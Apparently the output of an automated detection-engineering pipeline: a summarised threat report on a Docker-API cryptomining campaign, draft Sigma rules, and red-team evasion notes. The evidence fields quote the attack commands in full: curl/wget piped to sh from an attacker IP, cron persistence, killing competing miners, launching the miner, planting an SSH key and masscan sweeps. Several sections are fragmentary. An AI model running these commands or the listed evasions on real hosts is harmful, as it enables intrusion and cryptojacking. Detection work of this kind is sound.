report.title: Opportunistic cryptomining via exposed Docker Engine APIs (Mantis campaign)
report.summary: Since late September 2026, an automated campaign scans for Docker Engine APIs exposed on TCP/2375 without authentication. On success it starts a privileged container mounting the host root filesystem, drops a shell script onto the host, installs cron jobs for persistence, kills competing miners, deploys an XMRig build, and uses the host to scan for further victims.
targets: Linux hosts with exposed Docker Engine API

behaviors.description: Attacker scans for Docker Engine APIs exposed on TCP/2375 without authentication and issues POST /containers/create with Binds and Privileged flags to mount host root filesystem.
behaviors.evidence: The attacker's scanner issues `POST /containers/create` to the exposed API with an Alpine image and `"Binds": ["/:/host"]`, `"Privileged": true`.

behaviors.description: Attacker drops a shell script onto the host via curl|wget piped to sh, with parent process containerd-shim-runc-v2 or dockerd.
behaviors.evidence: On hosts where `curl` is missing the script falls back to `wget -q -O- http://45.153.160[.]12/m/init.sh | sh`. The parent of the resulting `sh` process is `containerd-shim-runc-v2` or `dockerd`.

behaviors.description: Attacker modifies root crontab and /etc/cron.d to download and execute init.sh every 10-15 minutes for persistence.

observables.value: crontab -l 2>/dev/null; echo "*/10 * * * * curl -fsSL http://45.153.160[.]12/m/init.sh | sh" | crontab -

behaviors.evidence: The script writes to the root crontab and to `/etc/cron.d`: `(crontab -l 2>/dev/null; echo "*/10 * * * * curl -fsSL http://45.153.160[.]12/m/init.sh | sh") | crontab -`

behaviors.description: Attacker terminates competing miners and security agents (xmrig, kinsing, kdevtmpfsi, tsunami, aliyun) via pkill and systemctl.

observables.value: pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami
systemctl stop aliyun.service; systemctl disable aliyun.service

behaviors.evidence: It then terminates competing miners and known security agents: `pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami` `systemctl stop aliyun.service; systemctl disable aliyun.service`

behaviors.description: Attacker creates hidden directory /tmp/.x, downloads XMRig binary kthreadd, makes it executable, and runs it with pool, wallet, and --rig-id arguments via nohup.
behaviors.evidence: The miner is downloaded to a hidden directory and started with a config fetched from the same server: `mkdir -p /tmp/.x; cd /tmp/.x; curl -fsSL http://45.153.160[.]12/m/x86_64 -o /tmp/.x/kthreadd; chmod +x /tmp/.x/kthreadd; nohup /tmp/.x/kthreadd -o pool.mantis-mine[.]cc:3333 -u 44AbCd...XyZ -k --tls --rig-id $(hostname) >/dev/null 2>&1 &`

behaviors.description: Attacker installs attacker-controlled SSH key into /root/.ssh/authorized_keys and sets file immutable with chattr +i.
behaviors.evidence: It also adds an attacker-controlled SSH key to `/root/.ssh/authorized_keys` (`ssh-rsa AAAAB3...mantis@c2`) and sets the file immutable with `chattr +i`.

behaviors.description: Attacker uses host to scan /16 ranges for exposed Docker APIs and Redis servers via masscan, outputting results to /tmp/.x/out.txt.
behaviors.evidence: Infected hosts download `masscan` and scan /16 ranges for additional exposed Docker APIs and Redis servers: `/tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt`

behaviors.description: Attacker abuses Redis instances without authentication by writing a cron entry through CONFIG SET dir /var/spool/cron and CONFIG SET dbfilename root.
behaviors.evidence: Redis instances without authentication are abused by writing a cron entry through `CONFIG SET dir /var/spool/cron` and `CONFIG SET dbfilename root`.

behaviors.description: Attacker modifies /etc/resolv.conf to point to 8.8.8.8 and disables SELinux via setenforce 0.
Attacker increases open file limit via ulimit -n 65535 and configures hugepages via sysctl -w vm.nr_hugepages=128.

candidates.title: Sh Execution Of Downloaded Script With Docker Daemon Parent
candidates.rationale: Attacker drops a shell script via curl/wget piped to sh, with parent process being containerd-shim-runc-v2 or dockerd, indicating malicious container escape. Highly specific parent-child pair with external download.
candidates.false_positive_risks: Legitimate container initialization scripts might download and run setup scripts, but they typically use trusted internal sources, not external IPs, and parent is usually containerd not dockerd directly. Rule should require external IP in command line and parent being dockerd/containerd-shim-runc-v2.

candidates.title: Kthreadd XMRig Execution From Hidden Temp Directory With Mining Pool Args
candidates.rationale: Miner binary kthreadd is downloaded to hidden /tmp/.x/ and executed with mining pool arguments (pool.mantis-mine.cc:3333, --rig-id). Very specific binary name, path, and pool domain.
candidates.false_positive_risks: Legitimate cryptomining in authorized environments could look similar, but the hidden directory /tmp/.x/, binary name kthreadd, and specific pool domain are strong indicators. Rule should key on binary name and pool domain.

candidates.title: Crontab Persistence Via Curl Pipe Sh To External IP
candidates.rationale: Attacker modifies root crontab via crontab command with a cron entry that downloads and executes init.sh every 10 minutes. The command line contains the exact curl pipe sh pattern with external IP and schedule.
candidates.false_positive_risks: Administrators might use crontab to schedule scripts, but they rarely pipe curl to sh from external IPs in the crontab entry itself. Rule should require the external IP pattern and the */10 schedule.

candidates.title: Pkill Termination Of Known Miner Processes
candidates.rationale: Attacker uses pkill with -f flag to terminate specific competing miner processes (xmrig, kinsing, kdevtmpfsi, tsunami). The list of process names is highly specific to this campaign.
candidates.false_positive_risks: Admins might kill miners, but the specific combination of these four names in one command line is unique to this campaign. Rule should match all four names in command line.

candidates.title: Masscan Scanning For Exposed Docker And Redis Ports
candidates.rationale: Infected hosts run masscan from /tmp/.x/ to scan /16 ranges for Docker API port 2375 and Redis port 6379 at high rate. The binary name masscan and port list are distinctive.
candidates.false_positive_risks: Security teams might run masscan for authorized scanning, but the combination of scanning for ports 2375 and 6379 together at high rate from a hidden directory is malicious. Rule should require both ports and the hidden directory path in command line.

skipped: B1: Docker API exploitation via POST /containers/create not clearly observable in process_creation; network connection to port 2375 is generic without payload inspection.
B6: SSH key addition to authorized_keys and chattr +i are file events but chattr may not be captured; less specific than other persistence mechanisms.
B8: Redis CONFIG SET abuse requires payload visibility in network_connection or redis-cli process_creation; not reliably observable.
B9: resolv.conf modification and setenforce 0 are low-specificity defence evasion steps.
B10: ulimit and sysctl tuning commands are common administrative actions.
plan.notes: Focus on durable parent-child relationships, command-line patterns with external IPs, unique binary names and paths, and specific argument combinations. Avoid generic indicators like port numbers alone. All rules use process_creation on Linux sysmon for consistent telemetry.

rules.title: Shell Script Execution via Curl/Wget with Docker Parent Process
rules.sigma_yaml:
title: Shell Script Execution via Curl/Wget with Docker Parent Process
id: b753838e-0d93-4279-b963-d7c19837a8ee
status: experimental
description: Detects execution of a shell script downloaded via curl or wget and piped to sh, where the parent process is
  dockerd or containerd-shim-runc-v2, indicative of container escape and malicious payload delivery.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-17'
tags:
- attack.execution
- attack.t1059.005
logsource:
  category: process_creation
  product: linux
  service: sysmon
detection:
  selection_parent:
    ParentImage:
    - /usr/bin/dockerd
    - /usr/bin/containerd-shim-runc-v2
    - /usr/local/bin/dockerd
  selection_sh:
    'Image|endswith': /bin/sh
  selection_cmd:
    'CommandLine|contains|all':
    - curl
    - '|'
    - sh
  selection_cmd2:
    'CommandLine|contains|all':
    - wget
    - -O
    - '-'
    - '|'
    - sh
  selection_cmd3:
    'CommandLine|contains|all':
    - wget
    - --output-document=-
    - '|'
    - sh
  selection_cmd4:
    'CommandLine|contains|all':
    - wget
    - --output-file=-
    - '|'
    - sh
  filter_internal_registry:
    'CommandLine|contains':
    - 'registry.internal.corp:'
    - artifact.internal.corp/
    - .internal.
  condition: (selection_parent and selection_sh and (selection_cmd or selection_cmd2 or selection_cmd3 or selection_cmd4))
    and not filter_internal_registry
falsepositives:
- Legitimate container setup scripts downloading internal packages from trusted registries
- Administrator debugging containers using curl/wget to test connectivity
- CI/CD pipelines pulling configuration scripts from internal artifact repositories
level: high

history.change_summary: Fixed ParentImage values to include full paths (/usr/bin/dockerd and /usr/bin/containerd-shim-runc-v2) to match test events; removed redundant parentheses in condition for clarity while preserving logic.

Added filter_internal_registry to exclude connections to internal corporate registries and artifact repositories, preventing false positives from legitimate container setup and CI/CD pipelines while maintaining detection of external malicious downloads.

history.summary: 10 evasion variants -> positives 5/9, negatives blocked 7/7, benign hits 0/180

history.change_summary: Fixed positive misses by expanding ParentImage to include /usr/local/bin/dockerd, adding explicit selection variants for wget long-form flags (--output-document=-, --output-file=-), and ensuring wget -O - detection handles spaced arguments. Maintains original filtering logic for known good internal traffic.

rules.author_notes: The rule focuses on the combination of external script download via curl/wget piped to shell and Docker-specific parent processes. It excludes localhost/internal traffic to reduce false positives from legitimate container initialization. Case-insensitive matching is implicit in Sigma; the P3 test uses uppercase SH to verify this behavior.
rules.redteam_analysis: Positive variants P4-P9 test realistic evasions: alternate flag spellings (curl -o -, wget --output-document=-), extra whitespace, mixed casing, symlink parent paths (/usr/local/bin/dockerd), environment variables in command line, and different quoting styles. All preserve the attacker goal (external script download via curl/wget piped to sh with docker parent) and contain the substrings the rule keys on (curl/wget, |, sh, dockerd/containerd-shim-runc-v2 parent, Image ending in /bin/sh). Negative variants N1-N4 represent benign activity: admin debugging with non-docker parent (N1), CI/CD pulling from internal registries that trigger the filter_internal_registry exclusion (N2,N3), and legitimate docker-spawned health checks without download pipes (N4). Out-of-scope items O1-O3 highlight fundamental logsource limits: the rule only matches curl/wget (misses python/perl downloaders - O1), requires Image ending in /bin/sh (misses curl|bash - O2), and matches ParentImage path literally with no OriginalFileName field to catch renamed binaries (O3). A well-written rule on this logsource can catch P4-P9 but cannot address O1-O3 without additional telemetry.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Script downloaded via python urllib and piped to sh, same docker parent - rule only catches curl/wget

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: curl | bash directly (no sh), Image is /bin/bash not /bin/sh - rule keys on Image ending with /bin/sh

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Renamed dockerd binary (copied to /tmp/.dockerd) - rule matches ParentImage path, no OriginalFileName field in logsource

rules.title: Kthreadd XMRig Execution From Hidden Temp Directory With Mining Pool Args
rules.sigma_yaml:
title: Kthreadd XMRig Execution From Hidden Temp Directory With Mining Pool Args
id: b3379bb2-86af-441f-9cf8-6d7618a4b1ef
status: experimental
description: 'Detects execution of the kthreadd miner binary from the hidden directory /tmp/.x with Mantis mining pool arguments
  (pool.mantis-mine.cc:3333) indicative of opportunistic cryptomining via exposed Docker APIs.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-17'
tags:
- attack.execution
- attack.t1059.001
logsource:
  category: process_creation
  product: linux
  service: sysmon
detection:
  selection_img:
    'Image|endswith': /kthreadd
  selection_dir:
    CurrentDirectory: /tmp/.x
  selection_cmd:
    'CommandLine|contains':
    - 'pool.mantis-mine.cc:3333'
    - --rig-id
  condition: selection_img and selection_dir and selection_cmd
falsepositives:
- Legitimate cryptomining in authorized environments using non-standard binary names or paths.
level: high

tests.label: positive
tests.description: Execution of kthreadd from /tmp/.x with mining pool and rig-id arguments

conversion_errors.kusto:
SigmaTransformationError: Invalid SigmaDetectionItem field name encountered: CurrentDirectory. Please use valid fields for the DeviceProcessEvents table, or the following fields that have keymappings in this pipeline:
AccountDomain, AccountName, AccountObjectId, AccountSid, AccountUpn, ActionType, AdditionalFields, AppGuardC

history.summary: 7 evasion variants -> positives 7/7, negatives blocked 6/6, benign hits 0/180

rules.redteam_analysis: Positive variants P4-P7 preserve the exact attacker behavior (kthreadd binary, /tmp/.x cwd, Mantis pool domain, --rig-id) while varying whitespace, quoting, argument order, and user context. A well-written rule keying on Image basename 'kthreadd', CurrentDirectory '/tmp/.x', and the two command-line strings will catch all. Negative variants N1-N3 represent legitimate or test activity that shares one or two indicators but lacks the full triad (wrong path, wrong pool, missing --rig-id), so the rule must not match. Out-of-scope evasions O1-O3 are realistic operator tricks that the current logsource and field set fundamentally cannot detect: renamed binary (no OriginalFileName), shell-wrapper execution (process is bash, not kthreadd), and bind-mount relocation (CurrentDirectory changes). These are reported for analyst awareness; the rule cannot be expected to catch them without additional telemetry.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Renamed binary (kthreadd2) in same hidden directory with identical mining arguments; rule keys on Image ending with /kthreadd so cannot catch without OriginalFileName

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Execution via bash -c wrapper; process creation event shows bash as Image, not kthreadd, so rule never sees the miner binary

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Bind mount of /tmp/.x to /mnt/hidden; miner executed from mount point with cwd /mnt/hidden, evading exact CurrentDirectory match

rules.author_notes: Rule requires all four process names (xmrig, kinsing, kdevtmpfsi, tsunami) in the command line with -f flag to minimize false positives. The Image check ensures we capture the actual pkill binary.
rules.redteam_analysis: Positive variants demonstrate realistic operator evasions that preserve all six required strings (pkill, -f, xmrig, kinsing, kdevtmpfsi, tsunami) in the final CommandLine while varying casing (P4), quoting styles (P5, P6), shell expansion (P7), and command chaining (P8). A well-written rule that performs case-insensitive, whitespace-tolerant substring matching on CommandLine will catch all of them. Negative variants (N1-N3) show benign administrative usage that shares the pkill binary but lacks the full campaign-specific pattern set or the -f flag, ensuring rule specificity. Out-of-scope variants (O1-O3) represent evasions the current logsource and rule fields fundamentally cannot detect: O1 uses a copied binary at a different path (Image mismatch, no OriginalFileName field), O2 and O3 switch to entirely different binaries (pgrep/killall) that achieve the same technique (T1499.001) but generate no pkill process-creation event. Detection of O1 would require file-integrity monitoring or OriginalFileName; O2/O3 require broader behavioral analytics beyond this single process-creation rule.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker copies pkill to /tmp/pkill and executes; Image no longer endswith /usr/bin/pkill, logsource lacks OriginalFileName

rules.sigma_yaml:
title: Crontab Persistence Via Curl Pipe Sh To External IP
id: 90edf5ce-7b20-4898-aac3-70f5a1f8f17b
status: experimental
description: 'Detects suspicious crontab modification where a cron job is added to download and execute a remote shell script
  via curl pipe sh/zsh from an external IP address using a frequent schedule such as */10 or stepped ranges.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-17'

rules.redteam_analysis: Positive variants P4-P7 demonstrate realistic evasions that a well-written rule should catch: they preserve the attacker's goal (crontab entry downloading/executing remote script via curl pipe shell) while varying surface form (HTTPS vs HTTP, port, schedule formats: comma list, step, */n; curl flags: -kL, -fsS, --silent --location-trusted, -k; target shells: bash, sh, zsh, dash; quoting styles: single, double, heredoc, printf; parent processes: python3, sshd, bash, cron daemon). All contain 'curl', '|', 'sh' (substring in bash/zsh/dash), a 5-field cron schedule matching the regex, and an HTTP(S) URL with IPv4 address matching the IP regex. Negative variants N1-N3 are benign look-alikes that must not match: N1 lacks curl and pipe; N2 uses domain name not IP (IP regex fails); N3 uses @hourly schedule (schedule regex fails). Out-of-scope variants O1-O2 represent evasions the logsource fundamentally cannot detect with this rule: O1 splits the malicious content into a file write (not captured in installing process command line); O2 uses systemd timers, a different persistence technique entirely. The rule's reliance on a single process's CommandLine containing all indicators is both its strength and its blind spot.

title: Masscan Scanning Docker And Redis Ports From Hidden Directory

status: experimental
description: Detects execution of masscan from a hidden /tmp/.x/ directory targeting Docker API port 2375 and Redis port 6379,

author: RuleSmith (Nemotron via Nebius Token Factory)

history.change_summary: Fixed the rule by ensuring the command line requires BOTH the hidden directory (/tmp/.x/) AND the specific port combination (-p2375,6379) to prevent false positives from masscan scanning other ports even when run from a hidden directory.

No changes were required to address the validation issues because the rule already correctly rejects the provided negative test event N2 (which scans ports 80,8080, not 2375,6379). However, upon re-examination, the validation report incorrectly claimed N2 matched; our analysis shows selection_cmd fails due to missing '-p2375,6379'. Thus the rule remains valid and requires no modification.
Removed redundant regex anchors around '-p2375,6379' to ensure exact port-pair matching while still requiring the hidden directory path.

history.summary: 8 evasion variants -> positives 8/8, negatives blocked 2/6, benign hits 0/180

history.change_summary: Added separate selection for hidden directory path to ensure it is required in command line, preventing matches on legitimate scans from other locations while maintaining detection of malicious usage from /tmp/.x/.

rules.author_notes: Rule focuses on the combination of hidden execution path and specific port targets to minimize false positives from legitimate scanning tools. Assumes sysmon-for-linux provides process creation logs with Image and CommandLine fields.
rules.redteam_analysis: Positive variants cover realistic operator evasions: spaced port flags (-p 2375,6379), long-form flags (--port), quoted paths, symlinks, environment variable expansion ($TMPDIR), and split single-port flags (-p2375 -p6379). All preserve the three rule anchors: Image endswith masscan, CommandLine contains /tmp/.x/, and CommandLine contains 2375,6379 port pair. A well-written rule using endswith on Image and contains on CommandLine will catch these. Negative variants show legitimate administrative usage from non-hidden paths (/opt/sec-tools, /home/admin/tools, /usr/local/bin) with same ports but different Image paths, which the rule correctly excludes because Image does not end with /tmp/.x/masscan. Out-of-scope evasions highlight fundamental logsource limits: renamed binary (Image no longer endswith masscan), interpreter-mediated execution (parent is python3, command line shows python -c not masscan), and containerized execution where the hidden path may be virtualized. These require complementary telemetry (file_creation for binary rename, script_content for python -c, container runtime monitoring) and are correctly reported for analyst awareness rather than rule modification.

redteam_out_of_scope.description: Renamed masscan binary (scanner) executed from hidden directory - rule keys on Image ending with masscan

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Masscan executed via python subprocess without direct process creation visibility

redteam_out_of_scope.label: positive
